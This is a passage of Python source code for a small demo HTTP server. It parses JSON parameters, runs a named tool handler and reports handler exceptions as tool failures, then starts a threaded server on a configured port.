            params = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            self._send_json({"error": "bad json"}, 400)
            return
        try:
            result = tool["handler"](params)
        except Exception as e:  # a live demo can't 500 into dead air -- report it as a tool failure instead
            print(f"[error] tool '{name}' raised: {e}", flush=True)
            result = {"success": False, "summary": f"Tool '{name}' errored: {e}"}
        self._send_json(result)

    def log_message(self, fmt, *args):
        pass


if __name__ == "__main__":
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"tool-api listening on :{PORT}", flush=True)
    server.serve_forever()
